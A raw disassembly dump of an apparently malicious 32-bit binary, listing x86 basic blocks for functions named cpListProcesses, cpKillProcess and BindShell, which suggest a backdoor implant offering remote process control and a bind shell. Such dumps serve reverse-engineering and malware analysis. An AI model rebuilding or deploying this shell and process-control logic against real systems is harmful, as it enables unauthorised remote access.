0x804f9c3:	lea	eax, dword ptr [esp + 0x84c]
0x804f9ca:	push	eax
0x804f9cb:	call	0x804f57c
None
|
|
|
v
0x804f8fc:	push	esi
0x804f8fd:	push	edi
0x804f8fe:	push	1
0x804f900:	push	ebx
0x804f901:	call	0x804bcb0
None
|
|
|
v
0x804f7ec:	add	esp, 0x10
0x804f7ef:	test	eax, eax
0x804f7f1:	jns	0x804f7fc
None
|
|
|
v
0x804f95d:	mov	eax, dword ptr [esp + 0x850]
0x804f964:	add	esp, 0x10
0x804f967:	cmp	byte ptr [eax + 0x3300], 0
0x804f96e:	je	0x804f9c0
None
|
|
|
v
0x804f90d:	push	edi
0x804f90e:	push	edi
0x804f90f:	push	4
0x804f911:	push	dword ptr [esp + 0x84c]
0x804f918:	call	0x804f6b8
None
|
|
|
v
0x804f877:	push	0
0x804f879:	push	0x800
0x804f87e:	push	ebx
0x804f87f:	push	dword ptr [esp + 0x838]
0x804f886:	call	0x804bfa0
None
|
|
|
v
0x804f7a9:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804f86c:	push	eax
0x804f86d:	push	0
0x804f86f:	push	0
0x804f871:	push	esi
0x804f872:	call	0x804bc90
None
|
|
|
v
0x804f7fc:	mov	eax, dword ptr [esp + 0x840]
0x804f803:	push	edx
0x804f804:	lea	edx, dword ptr [eax + 0x1100]
0x804f80a:	push	edx
0x804f80b:	push	eax
0x804f80c:	push	0x80560fb
0x804f811:	push	0x800
0x804f816:	push	1
0x804f818:	push	0x800
0x804f81d:	lea	ebx, dword ptr [esp + 0x28]
0x804f821:	push	ebx
0x804f822:	mov	edi, ebx
0x804f824:	call	0x804bb70
None
|
|
|
v
0x804f9a3:	add	esp, 0x10
0x804f9a6:	xor	eax, eax
0x804f9a8:	jmp	0x804f9d5
None
|
|
|
v
0x804f88b:	add	esp, 0x1c
0x804f88e:	push	ebx
0x804f88f:	push	0x8056128
0x804f894:	push	0
0x804f896:	mov	edi, eax
0x804f898:	call	0x8051d7f
None
|
|
|
v
0x804f787:	add	esp, 0x10
0x804f78a:	test	eax, eax
0x804f78c:	mov	edx, eax
0x804f78e:	jne	0x804f799
None
|
|
|
v
0x804f927:	push	0
0x804f929:	push	0x800
0x804f92e:	push	ebx
0x804f92f:	push	dword ptr [esp + 0x828]
0x804f936:	call	0x804bfa0
None
|
|
|
v
0x804f7f3:	push	edi
0x804f7f4:	push	edi
0x804f7f5:	push	2
0x804f7f7:	jmp	0x804f976
None
|
|
|
v
0x804f8b5:	push	ebp
0x804f8b6:	push	ebp
0x804f8b7:	push	5
0x804f8b9:	push	dword ptr [esp + 0x84c]
0x804f8c0:	call	0x804f6b8
None
|
|
|
v
0x804f906:	add	esp, 0x10
0x804f909:	cmp	eax, edi
0x804f90b:	je	0x804f927
None
|
|
|
v
0x804f799:	lea	ebx, dword ptr [esp + 0x80c]
0x804f7a0:	xor	eax, eax
0x804f7a2:	mov	ecx, 4
0x804f7a7:	mov	edi, ebx
0x804f7a9:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804f976:	push	dword ptr [esp + 0x84c]
0x804f97d:	call	0x804f6b8
None
|
|
|
v
0x804f830:	add	esp, 0x20
0x804f833:	push	0
0x804f835:	not	ecx
0x804f837:	dec	ecx
0x804f838:	push	ecx
0x804f839:	push	ebx
0x804f83a:	push	dword ptr [esp + 0x828]
0x804f841:	call	0x804bfe0
None
|
|
|
v
0x804f85f:	add	esp, 0x10
0x804f862:	test	eax, eax
0x804f864:	mov	esi, eax
0x804f866:	je	0x804f972
None
|
|
|
v
0x804f89d:	add	esp, 0xc
0x804f8a0:	push	ebx
0x804f8a1:	push	0x8056089
0x804f8a6:	push	0
0x804f8a8:	mov	ebp, eax
0x804f8aa:	call	0x8051d7f
None
|
|
|
v
0x804f8cd:	mov	eax, dword ptr [esp + 0x850]
0x804f8d4:	add	eax, 0x2200
0x804f8d9:	mov	dword ptr [esp], eax
0x804f8dc:	call	0x804f0fc
None
|
|
|
v
0x804f8c5:	mov	dword ptr [esp], esi
0x804f8c8:	call	0x804bbe0
None
|
|
|
v
0x804f829:	xor	eax, eax
0x804f82b:	or	ecx, 0xffffffff
0x804f82e:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804f93b:	add	esp, 0x10
0x804f93e:	test	eax, eax
0x804f940:	mov	edi, eax
0x804f942:	jne	0x804f8fc
None
|
|
|
v
0x804f944:	sub	esp, 0xc
0x804f947:	push	esi
0x804f948:	call	0x804bbe0
None
|
|
|
v
0x804f76c:	mov	dword ptr [esp + 0x82c], eax
0x804f773:	mov	eax, dword ptr [esp + 0x850]
0x804f77a:	add	eax, 0x1100
0x804f77f:	mov	dword ptr [esp], eax
0x804f782:	call	0x804bf60
None
|
|
|
v
0x804f8e1:	jmp	0x804f982
None
|
|
|
v
0x804f9aa:	push	edx
0x804f9ab:	add	eax, 0x2200
0x804f9b0:	push	0
0x804f9b2:	push	0x8056528
0x804f9b7:	push	eax
0x804f9b8:	call	0x804f0a6
None
|
|
|
v
0x804f970:	jmp	0x804f9aa
None
|
|
|
v
0x804f94d:	pop	ebx
0x804f94e:	pop	esi
0x804f94f:	push	6
0x804f951:	push	dword ptr [esp + 0x84c]
0x804f958:	call	0x804f6b8
None
|
|
|
v
0x804f846:	pop	ecx
0x804f847:	pop	esi
0x804f848:	push	0x80560d6
0x804f84d:	mov	eax, dword ptr [esp + 0x84c]
0x804f854:	add	eax, 0x2200
0x804f859:	push	eax
0x804f85a:	call	0x804bca0
None
|
|
|
v
0x804f9c0:	sub	esp, 0xc
0x804f9c3:	lea	eax, dword ptr [esp + 0x84c]
0x804f9ca:	push	eax
0x804f9cb:	call	0x804f57c
None
|
|
|
v
0x804f8e6:	add	ebp, 4
0x804f8e9:	push	esi
0x804f8ea:	sub	edi, ebp
0x804f8ec:	push	edi
0x804f8ed:	add	ebp, ebx
0x804f8ef:	push	1
0x804f8f1:	push	ebp
0x804f8f2:	call	0x804bcb0
None
|
|
|
v
0x804f82e:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804f727:	push	ebp
0x804f728:	push	edi
0x804f729:	push	esi
0x804f72a:	push	ebx
0x804f72b:	sub	esp, 0x834
0x804f731:	mov	edx, dword ptr [0x805b9f4]
0x804f737:	mov	eax, dword ptr [esp + 0x848]
0x804f73e:	mov	dword ptr [esp + 0x824], 0xffffffff
0x804f749:	mov	dword ptr [eax + 0x3308], edx
0x804f74f:	inc	edx
0x804f750:	push	0
0x804f752:	push	eax
0x804f753:	mov	dword ptr [0x805b9f4], edx
0x804f759:	call	0x804f6b8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:FindSpace
TOTAL BLOCKS :7
0x804fa02:	or	eax, 0xffffffff
0x804fa05:	pop	ebx
0x804fa06:	pop	esi
0x804fa07:	ret	
None
|
|
|
v
0x804f9f0:	cmp	cl, 0x20
0x804f9f3:	jne	0x804f9fa
None
|
|
|
v
0x804f9fa:	inc	eax
0x804f9fb:	mov	cl, byte ptr [esi + eax]
0x804f9fe:	test	cl, cl
0x804fa00:	jne	0x804f9f0
None
|
|
|
v
0x804f9fb:	mov	cl, byte ptr [esi + eax]
0x804f9fe:	test	cl, cl
0x804fa00:	jne	0x804f9f0
None
|
|
|
v
0x804f9e0:	push	esi
0x804f9e1:	xor	edx, edx
0x804f9e3:	push	ebx
0x804f9e4:	xor	eax, eax
0x804f9e6:	mov	esi, dword ptr [esp + 0xc]
0x804f9ea:	mov	ebx, dword ptr [esp + 0x10]
0x804f9ee:	jmp	0x804f9fb
None
|
|
|
v
0x804f9f5:	inc	edx
0x804f9f6:	cmp	edx, ebx
0x804f9f8:	jge	0x804fa05
None
|
|
|
v
0x804fa05:	pop	ebx
0x804fa06:	pop	esi
0x804fa07:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpListProcesses
TOTAL BLOCKS :55
0x804fab0:	add	esp, 0x10
0x804fab3:	mov	byte ptr [esp + 0x13], 1
0x804fab8:	sub	esp, 0xc
0x804fabb:	push	ebx
0x804fabc:	call	0x804bbe0
None
|
|
|
v
0x804fc6d:	add	esp, 0x10
0x804fc70:	cmp	eax, 2
0x804fc73:	jne	0x804fd2d
None
|
|
|
v
0x804fbc0:	lea	eax, dword ptr [esp + 0x28]
0x804fbc4:	add	esp, 0xc
0x804fbc7:	push	dword ptr [esp + 0x18]
0x804fbcb:	push	dword ptr [esp + 0x4aa0]
0x804fbd2:	push	eax
0x804fbd3:	call	0x804be70
None
|
|
|
v
0x804fb2d:	push	edi
0x804fb2e:	push	0x40
0x804fb30:	push	0x8056154
0x804fb35:	push	ebp
0x804fb36:	call	0x8051ce0
None
|
|
|
v
0x804fb20:	add	esp, 0x10
0x804fb23:	test	eax, eax
0x804fb25:	mov	ebx, eax
0x804fb27:	je	0x804fd2d
None
|
|
|
v
0x804fcb6:	cmp	eax, 0xff
0x804fcb9:	jne	0x804fcd1
None
|
|
|
v
0x804fd44:	mov	ebx, dword ptr [esp + 4]
0x804fd48:	sub	esp, 0xc
0x804fd4b:	push	dword ptr [esp + 0x14]
0x804fd4f:	call	0x804bfc0
None
|
|
|
v
0x804fc02:	add	esp, 0x1c
0x804fc05:	push	dword ptr [esp + 0x4a68]
0x804fc0c:	push	dword ptr [esp + 0x4a70]
0x804fc13:	push	dword ptr [esp + 0x4a78]
0x804fc1a:	mov	eax, dword ptr [esp + 0x4a88]
0x804fc21:	add	eax, 0x76c
0x804fc26:	push	eax
0x804fc27:	mov	eax, dword ptr [esp + 0x4a88]
0x804fc2e:	inc	eax
0x804fc2f:	push	eax
0x804fc30:	push	dword ptr [esp + 0x4a88]
0x804fc37:	push	0x8056095
0x804fc3c:	push	0x40
0x804fc3e:	push	1
0x804fc40:	push	0x40
0x804fc42:	push	ebp
0x804fc43:	call	0x804bb70
None
|
|
|
v
0x804fcd6:	push	edx
0x804fcd7:	push	ebp
0x804fcd8:	push	esi
0x804fcd9:	lea	eax, dword ptr [esp + 0x3230]
0x804fce0:	push	eax
0x804fce1:	lea	eax, dword ptr [esp + 0x2234]
0x804fce8:	push	eax
0x804fce9:	push	0x805616d
0x804fcee:	push	1
0x804fcf0:	lea	edi, dword ptr [esp + 0x4ac4]
0x804fcf7:	push	edi
0x804fcf8:	call	0x804bd20
None
|
|
|
v
0x804fcd1:	mov	byte ptr [esp + eax + 0x24], 0
0x804fcd6:	push	edx
0x804fcd7:	push	ebp
0x804fcd8:	push	esi
0x804fcd9:	lea	eax, dword ptr [esp + 0x3230]
0x804fce0:	push	eax
0x804fce1:	lea	eax, dword ptr [esp + 0x2234]
0x804fce8:	push	eax
0x804fce9:	push	0x805616d
0x804fcee:	push	1
0x804fcf0:	lea	edi, dword ptr [esp + 0x4ac4]
0x804fcf7:	push	edi
0x804fcf8:	call	0x804bd20
None
|
|
|
v
0x804fa4b:	mov	dword ptr [esp + 0x24], eax
0x804fa4f:	pop	eax
0x804fa50:	pop	edx
0x804fa51:	push	0x80560d3
0x804fa56:	push	0x8056134
0x804fa5b:	call	0x804bca0
None
|
|
|
v
0x804fa83:	add	esp, 0x10
0x804fa86:	test	eax, eax
0x804fa88:	je	0x804fab8
None
|
|
|
v
0x804fb76:	push	eax
0x804fb77:	push	eax
0x804fb78:	push	0x15
0x804fb7a:	push	edi
0x804fb7b:	call	0x804f9e0
None
|
|
|
v
0x804fd54:	mov	eax, dword ptr [esp + 0x4ab4]
0x804fd5b:	add	esp, 0x10
0x804fd5e:	test	ebx, ebx
0x804fd60:	jle	0x804fd66
None
|
|
|
v
0x804fb8d:	add	esp, 0x10
0x804fb90:	cmp	ebx, 0xff
0x804fb93:	je	0x804fc4b
None
|
|
|
v
0x804fc9d:	add	esp, 0x1c
0x804fca0:	push	0x1100
0x804fca5:	push	esi
0x804fca6:	push	ebx
0x804fca7:	call	0x804bc80
None
|
|
|
v
0x804fc79:	push	ebx
0x804fc7a:	push	ebx
0x804fc7b:	push	dword ptr [esp + 0x14]
0x804fc7f:	push	0x8056160
0x804fc84:	push	0x1100
0x804fc89:	push	1
0x804fc8b:	push	0x1100
0x804fc90:	lea	ebx, dword ptr [esp + 0x1140]
0x804fc97:	push	ebx
0x804fc98:	call	0x804bb70
None
|
|
|
v
0x804fb3b:	push	ebx
0x804fb3c:	push	0x800
0x804fb41:	push	1
0x804fb43:	lea	edi, dword ptr [esp + 0x4240]
0x804fb4a:	push	edi
0x804fb4b:	call	0x804bce0
None
|
|
|
v
0x804fa32:	mov	dword ptr [esp + 0x18], eax
0x804fa36:	add	esp, 0x10
0x804fa39:	test	eax, eax
0x804fa3b:	je	0x804fd86
None
|
|
|
v
0x804fd07:	sub	esp, 0xc
0x804fd0a:	push	1
0x804fd0c:	push	eax
0x804fd0d:	push	edi
0x804fd0e:	push	dword ptr [esp + 0x1c]
0x804fd12:	lea	eax, dword ptr [esp + 0x4ac0]
0x804fd19:	push	eax
0x804fd1a:	call	0x8051f2f
None
|
|
|
v
0x804fd1f:	add	dword ptr [esp + 0x24], ebx
0x804fd23:	mov	dword ptr [esp + 0x4ac4], eax
0x804fd2a:	add	esp, 0x20
0x804fd2d:	sub	esp, 0xc
0x804fd30:	push	dword ptr [esp + 0x14]
0x804fd34:	call	0x804bef0
None
|
|
|
v
0x804fd62:	test	eax, eax
0x804fd64:	je	0x804fd86
None
|
|
|
v
0x804fcbb:	push	ecx
0x804fcbc:	push	0x1100
0x804fcc1:	push	0x8056154
0x804fcc6:	push	esi
0x804fcc7:	call	0x8051ce0
None
|
|
|
v
0x804fb5d:	add	esp, 0x10
0x804fb60:	mov	edx, dword ptr [esp]
0x804fb63:	test	edx, edx
0x804fb65:	jle	0x804fd2d
None
|
|
|
v
0x804fb50:	add	esp, 0x14
0x804fb53:	push	ebx
0x804fb54:	mov	dword ptr [esp + 0x10], eax
0x804fb58:	call	0x804bbe0
None
|
|
|
v
0x804fa97:	add	esp, 0xc
0x804fa9a:	lea	edx, dword ptr [esp + 0x4a94]
0x804faa1:	push	edx
0x804faa2:	push	0x80565da
0x804faa7:	add	eax, 6
0x804faaa:	push	eax
0x804faab:	call	0x804beb0
None
|
|
|
v
0x804fab8:	sub	esp, 0xc
0x804fabb:	push	ebx
0x804fabc:	call	0x804bbe0
None
|
|
|
v
0x804fd2d:	sub	esp, 0xc
0x804fd30:	push	dword ptr [esp + 0x14]
0x804fd34:	call	0x804bef0
None
|
|
|
v
0x804fd86:	push	0
0x804fd88:	push	0
0x804fd8a:	push	0x25
0x804fd8c:	push	dword ptr [esp + 0x4adc]
0x804fd93:	call	0x804e62a
None
|
|
|
v
0x804fa8a:	push	eax
0x804fa8b:	push	eax
0x804fa8c:	push	0x805613f
0x804fa91:	push	esi
0x804fa92:	call	0x804bb80
None
|
|
|
v
0x804fba2:	mov	byte ptr [esp + eax + 0x4224], 0
0x804fbaa:	add	edi, ebx
0x804fbac:	push	eax
0x804fbad:	lea	eax, dword ptr [esp + 0x4a9c]
0x804fbb4:	push	eax
0x804fbb5:	push	0x80565da
0x804fbba:	push	edi
0x804fbbb:	call	0x804beb0
None
|
|
|
v
0x804fcfd:	add	esp, 0x20
0x804fd00:	cmp	eax, 0xff
0x804fd03:	mov	ebx, eax
0x804fd05:	je	0x804fd2d
None
|
|
|
v
0x804fa08:	push	ebp
0x804fa09:	push	edi
0x804fa0a:	push	esi
0x804fa0b:	push	ebx
0x804fa0c:	sub	esp, 0x4ac8
0x804fa12:	mov	dword ptr [esp + 0x4ab0], 0
0x804fa1d:	mov	dword ptr [esp + 0x4ab4], 0
0x804fa28:	push	0x805612d
0x804fa2d:	call	0x804bfd0
None
|
|
|
v
0x804faf5:	push	eax
0x804faf6:	push	eax
0x804faf7:	push	dword ptr [esp + 0x14]
0x804fafb:	push	0x8056146
0x804fb00:	push	0x1100
0x804fb05:	push	1
0x804fb07:	push	0x1100
0x804fb0c:	push	esi
0x804fb0d:	call	0x804bb70
None
|
|
|
v
0x804fccc:	add	esp, 0x10
0x804fccf:	jmp	0x804fcd6
None
|
|
|
v
0x804fac4:	xor	ebx, ebx
0x804fac6:	lea	esi, dword ptr [esp + 0x24]
0x804faca:	lea	ebp, dword ptr [esp + 0x4a24]
0x804fad1:	mov	dword ptr [esp + 4], ebx
0x804fad5:	jmp	0x804fd2d
None
|
|
|
v
0x804fa6e:	push	eax
0x804fa6f:	push	0x800
0x804fa74:	push	1
0x804fa76:	lea	esi, dword ptr [esp + 0x4230]
0x804fa7d:	push	esi
0x804fa7e:	call	0x804bce0
None
|
|
|
v
0x804fada:	add	eax, 0x13
0x804fadd:	mov	dword ptr [esp + 0xc], eax
0x804fae1:	sub	esp, 0xc
0x804fae4:	push	eax
0x804fae5:	call	0x805206c
None
|
|
|
v
0x804fd98:	add	esp, 0x4acc
0x804fd9e:	pop	ebx
0x804fd9f:	pop	esi
0x804fda0:	pop	edi
0x804fda1:	pop	ebp
0x804fda2:	ret	
None
|
|
|
v
0x804fd76:	pop	eax
0x804fd77:	lea	eax, dword ptr [esp + 0x4ab0]
0x804fd7e:	push	eax
0x804fd7f:	call	0x804f57c
None
|
|
|
v
0x804fd66:	push	ebx
0x804fd67:	push	eax
0x804fd68:	push	0x24
0x804fd6a:	push	dword ptr [esp + 0x4adc]
0x804fd71:	call	0x804e62a
None
|
|
|
v
0x804fb6b:	cmp	byte ptr [esp + 0x13], 0
0x804fb70:	je	0x804fc4b
None
|
|
|
v
0x804fd84:	jmp	0x804fd98
None
|
|
|
v
0x804fd39:	add	esp, 0x10
0x804fd3c:	test	eax, eax
0x804fd3e:	jne	0x804fada
None
|
|
|
v
0x804faea:	add	esp, 0x10
0x804faed:	test	al, al
0x804faef:	je	0x804fd2d
None
|
|
|
v
0x804fac1:	add	esp, 0x10
0x804fac4:	xor	ebx, ebx
0x804fac6:	lea	esi, dword ptr [esp + 0x24]
0x804faca:	lea	ebp, dword ptr [esp + 0x4a24]
0x804fad1:	mov	dword ptr [esp + 4], ebx
0x804fad5:	jmp	0x804fd2d
None
|
|
|
v
0x804fcac:	add	esp, 0x10
0x804fcaf:	cmp	eax, 0x10ff
0x804fcb4:	jg	0x804fcbb
None
|
|
|
v
0x804fa60:	add	esp, 0x10
0x804fa63:	mov	byte ptr [esp + 0x13], 0
0x804fa68:	test	eax, eax
0x804fa6a:	mov	ebx, eax
0x804fa6c:	je	0x804fac4
None
|
|
|
v
0x804fc4b:	lea	eax, dword ptr [esp + 0x2224]
0x804fc52:	push	eax
0x804fc53:	lea	eax, dword ptr [esp + 0x3228]
0x804fc5a:	push	eax
0x804fc5b:	push	0x8056156
0x804fc60:	lea	eax, dword ptr [esp + 0x4230]
0x804fc67:	push	eax
0x804fc68:	call	0x804beb0
None
|
|
|
v
0x804fb12:	add	esp, 0x18
0x804fb15:	push	0x80560d3
0x804fb1a:	push	esi
0x804fb1b:	call	0x804bca0
None
|
|
|
v
0x804fb80:	pop	edx
0x804fb81:	pop	ecx
0x804fb82:	push	0x16
0x804fb84:	lea	ebx, dword ptr [eax + 1]
0x804fb87:	push	edi
0x804fb88:	call	0x804f9e0
None
|
|
|
v
0x804fbd8:	mov	eax, dword ptr [esp + 0x24]
0x804fbdc:	add	eax, dword ptr [esp + 0x4a9c]
0x804fbe3:	mov	dword ptr [esp + 0x4ab8], eax
0x804fbea:	sub	esp, 0xc
0x804fbed:	lea	eax, dword ptr [esp + 0x4a7c]
0x804fbf4:	push	eax
0x804fbf5:	lea	eax, dword ptr [esp + 0x4ac8]
0x804fbfc:	push	eax
0x804fbfd:	call	0x804bec0
None
|
|
|
v
0x804fa41:	sub	esp, 0xc
0x804fa44:	push	2
0x804fa46:	call	0x804bc60
None
|
|
|
v
0x804fc48:	add	esp, 0x30
0x804fc4b:	lea	eax, dword ptr [esp + 0x2224]
0x804fc52:	push	eax
0x804fc53:	lea	eax, dword ptr [esp + 0x3228]
0x804fc5a:	push	eax
0x804fc5b:	push	0x8056156
0x804fc60:	lea	eax, dword ptr [esp + 0x4230]
0x804fc67:	push	eax
0x804fc68:	call	0x804beb0
None
|
|
|
v
0x804fb99:	cmp	eax, 0xff
0x804fb9c:	je	0x804fc4b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpKillProcess
TOTAL BLOCKS :3
0x804fda3:	sub	esp, 0x18
0x804fda6:	push	dword ptr [esp + 0x1c]
0x804fdaa:	call	0x8051de0
None
|
|
|
v
0x804fdb9:	test	eax, eax
0x804fdbb:	sete	al
0x804fdbe:	add	esp, 0x1c
0x804fdc1:	ret	
None
|
|
|
v
0x804fdaf:	pop	ecx
0x804fdb0:	pop	edx
0x804fdb1:	push	9
0x804fdb3:	push	eax
0x804fdb4:	call	0x804bd90
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetCurrentProcessId
TOTAL BLOCKS :1
0x804fdc2:	jmp	0x804bcf0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:BindShell
TOTAL BLOCKS :86
0x804ffd1:	jmp	0x8050379
None
|
|
|
v
0x805008f:	mov	eax, dword ptr [0x805ba08]
0x8050094:	mov	dword ptr [esp], eax
0x8050097:	call	0x804bfb0
None
|
|
|
v
0x804ff4a:	test	eax, eax
0x804ff4c:	jns	0x804ff79
None
|
|
|
v
0x80502dd:	mov	dword ptr [esp + 8], 0x15
0x80502e5:	mov	dword ptr [esp + 4], 0x805618c
0x80502ed:	mov	eax, dword ptr [ebp - 0x820]
0x80502f3:	mov	dword ptr [esp], eax
0x80502f6:	call	0x804bdd0
None
|
|
|
v
0x805003d:	mov	eax, dword ptr [ebp - 0x82c]
0x8050043:	mov	dword ptr [esp + 0xc], 0
0x805004b:	mov	dword ptr [esp + 8], 0
0x8050053:	mov	dword ptr [esp + 4], 0x1f
0x805005b:	mov	dword ptr [esp], eax
0x805005e:	call	0x804e62a
None
|
|
|
v
0x804fe6a:	test	eax, eax
0x804fe6c:	jne	0x804fe7e
None
|
|
|
v
0x8050168:	mov	eax, dword ptr [0x805ba00]
0x805016d:	mov	dword ptr [ebp - 0x820], eax
0x8050173:	mov	eax, dword ptr [0x805ba04]
0x8050178:	mov	dword ptr [ebp - 0x81c], eax
0x805017e:	mov	eax, dword ptr [0x805ba0c]
0x8050183:	mov	dword ptr [ebp - 0x818], eax
0x8050189:	mov	eax, dword ptr [ebp - 0x82c]
0x805018f:	mov	dword ptr [esp + 0xc], 0xffffffff
0x8050197:	mov	edx, dword ptr [ebp - 0x824]
0x805019d:	mov	dword ptr [esp + 8], edx
0x80501a1:	mov	dword ptr [esp + 4], 0x1c
0x80501a9:	mov	dword ptr [esp], eax
0x80501ac:	call	0x804e62a
None
|
|
|
v
0x804fe49:	jmp	0x8050379
None
|
|
|
v
0x805002b:	mov	eax, dword ptr [0x805ba10]
0x8050030:	mov	dword ptr [esp], eax
0x8050033:	call	0x804bbb0
None
|
|
|
v
0x8050063:	jmp	0x8050379
None
|
|
|
v
0x804ffe3:	mov	dword ptr [esp], 0
0x804ffea:	call	0x804bfb0
None
|
|
|
v
0x805020f:	mov	dword ptr [esp + 8], 0x800
0x8050217:	lea	eax, dword ptr [ebp - 0x80c]
0x805021d:	mov	dword ptr [esp + 4], eax
0x8050221:	mov	eax, dword ptr [ebp - 0x818]
0x8050227:	mov	dword ptr [esp], eax
0x805022a:	call	0x804bba0
None
|
|
|
v
0x804fffb:	mov	dword ptr [esp], 2
0x8050002:	call	0x804bfb0
None
|
|
|
v
0x8050300:	mov	dword ptr [esp], 0x3e8
0x8050307:	call	0x804f548
None
|
|
|
v
0x804fe6e:	mov	dword ptr [esp], 0x805ba0c
0x804fe75:	call	0x804be80
None
|
|
|
v
0x8050068:	mov	eax, dword ptr [0x805b9fc]
0x805006d:	mov	dword ptr [esp], eax
0x8050070:	call	0x804bfb0
None
|
|
|
v
0x8050135:	mov	dword ptr [esp], 0
0x805013c:	call	0x804bd80
None
|
|
|
v
0x804fe7e:	mov	eax, dword ptr [ebp - 0x82c]
0x804fe84:	mov	dword ptr [esp + 0xc], 0
0x804fe8c:	mov	dword ptr [esp + 8], 0
0x804fe94:	mov	dword ptr [esp + 4], 0x1f
0x804fe9c:	mov	dword ptr [esp], eax
0x804fe9f:	call	0x804e62a
None
|
|
|
v
0x80501e5:	mov	eax, dword ptr [ebp - 0x82c]
0x80501eb:	mov	edx, dword ptr [ebp - 0x810]
0x80501f1:	mov	dword ptr [esp + 0xc], edx
0x80501f5:	lea	edx, dword ptr [ebp - 0x80c]
0x80501fb:	mov	dword ptr [esp + 8], edx
0x80501ff:	mov	dword ptr [esp + 4], 0x1e
0x8050207:	mov	dword ptr [esp], eax
0x805020a:	call	0x804e62a
None
|
|
|
v
0x8050379:	mov	eax, dword ptr [ebp - 0xc]
0x805037c:	xor	eax, dword ptr gs:[0x14]
0x8050383:	je	0x805038a
None
|
|
|
v
0x8050274:	mov	dword ptr [esp + 8], 1
0x805027c:	lea	eax, dword ptr [ebp - 0x828]
0x8050282:	mov	dword ptr [esp + 4], eax
0x8050286:	mov	eax, dword ptr [ebp - 0x814]
0x805028c:	mov	dword ptr [esp], eax
0x805028f:	call	0x804bcc0
None
|
|
|
v
0x805030c:	mov	dword ptr [esp + 8], 1
0x8050314:	mov	dword ptr [esp + 4], 0
0x805031c:	mov	eax, dword ptr [ebp - 0x814]
0x8050322:	mov	dword ptr [esp], eax
0x8050325:	call	0x804bcc0
None
|
|
|
v
0x8050026:	cmp	eax, 0xff
0x8050029:	je	0x805003d
None
|
|
|
v
0x805038a:	leave	
0x805038b:	ret	
None
|
|
|
v
0x80502cb:	cmp	dword ptr [ebp - 0x82c], 0
0x80502d2:	je	0x80502dd
None
|
|
|
v
0x80501d6:	mov	dword ptr [ebp - 0x810], eax
0x80501dc:	cmp	dword ptr [ebp - 0x810], 0
0x80501e3:	jle	0x805020f
None
|
|
|
v
0x805023e:	mov	eax, dword ptr [ebp - 0x82c]
0x8050244:	mov	edx, dword ptr [ebp - 0x810]
0x805024a:	mov	dword ptr [esp + 0xc], edx
0x805024e:	lea	edx, dword ptr [ebp - 0x80c]
0x8050254:	mov	dword ptr [esp + 8], edx
0x8050258:	mov	dword ptr [esp + 4], 0x1e
0x8050260:	mov	dword ptr [esp], eax
0x8050263:	call	0x804e62a
None
|
|
|
v
0x8050378:	nop	
None
|
|
|
v
0x804ff4e:	mov	eax, dword ptr [ebp - 0x82c]
0x804ff54:	mov	dword ptr [esp + 0xc], 0
0x804ff5c:	mov	dword ptr [esp + 8], 0
0x804ff64:	mov	dword ptr [esp + 4], 0x1f
0x804ff6c:	mov	dword ptr [esp], eax
0x804ff6f:	call	0x804e62a
None
|
|
|
v
0x804fdfd:	xor	eax, 1
0x804fe00:	test	al, al
0x804fe02:	je	0x804fe0e
None
|
|
|
v
0x8050385:	call	0x804bc30
None
|
|
|
v
0x804fdc8:	push	ebp
0x804fdc9:	mov	ebp, esp
0x804fdcb:	sub	esp, 0x848
0x804fdd1:	mov	eax, dword ptr [ebp + 8]
0x804fdd4:	mov	dword ptr [ebp - 0x82c], eax
0x804fdda:	mov	eax, dword ptr gs:[0x14]
0x804fde0:	mov	dword ptr [ebp - 0xc], eax
0x804fde3:	xor	eax, eax
0x804fde5:	mov	dword ptr [ebp - 0x824], 0x805617a
0x804fdef:	mov	eax, dword ptr [ebp - 0x824]
0x804fdf5:	mov	dword ptr [esp], eax
0x804fdf8:	call	0x804f12a
None
|
|
|
v
0x8050082:	mov	eax, dword ptr [0x805ba04]
0x8050087:	mov	dword ptr [esp], eax
0x805008a:	call	0x804bfb0
None
|
|
|
v
0x804fe7a:	test	eax, eax
0x804fe7c:	je	0x804fea9
None
|
|
|
v
0x805009c:	mov	eax, dword ptr [0x805ba0c]
0x80500a1:	mov	dword ptr [esp], eax
0x80500a4:	call	0x804bfb0
None
|
|
|
v
0x804fea9:	mov	eax, dword ptr [0x805ba00]
0x804feae:	mov	dword ptr [esp + 4], 3
0x804feb6:	mov	dword ptr [esp], eax
0x804feb9:	call	0x804bdf0
None
|
|
|
v
0x805014e:	mov	eax, dword ptr [0x805ba08]
0x8050153:	mov	dword ptr [esp], eax
0x8050156:	call	0x804bfb0
None
|
|
|
v
0x805036a:	mov	eax, dword ptr [ebp - 0x818]
0x8050370:	mov	dword ptr [esp], eax
0x8050373:	call	0x804bfb0
None
|
|
|
v
0x8050014:	cmp	eax, 0xff
0x8050017:	je	0x805003d
None
|
|
|
v
0x8050105:	mov	dword ptr [esp + 8], 1
0x805010d:	mov	dword ptr [esp + 4], 0
0x8050115:	mov	dword ptr [esp], 0
0x805011c:	call	0x804bcc0
None
|
|
|
v
0x804ff79:	mov	dword ptr [ebp - 0x820], 0
0x804ff83:	mov	dword ptr [ebp - 0x81c], 0
0x804ff8d:	mov	dword ptr [ebp - 0x818], 0
0x804ff97:	call	0x804bea0
None
|
|
|
v
0x805022f:	mov	dword ptr [ebp - 0x810], eax
0x8050235:	cmp	dword ptr [ebp - 0x810], 0
0x805023c:	jle	0x8050268
None
|
|
|
v
0x80501b1:	jmp	0x8050274
None
|
|
|
v
0x804fea4:	jmp	0x8050379
None
|
|
|
v
0x804ff9c:	mov	dword ptr [ebp - 0x814], eax
0x804ffa2:	cmp	dword ptr [ebp - 0x814], 0
0x804ffa9:	jns	0x804ffd6
None
|
|
|
v
0x805034e:	mov	eax, dword ptr [ebp - 0x81c]
0x8050354:	mov	dword ptr [esp], eax
0x8050357:	call	0x804bfb0
None
|
|
|
v
0x8050075:	mov	eax, dword ptr [0x805ba00]
0x805007a:	mov	dword ptr [esp], eax
0x805007d:	call	0x804bfb0
None
|
|
|
v
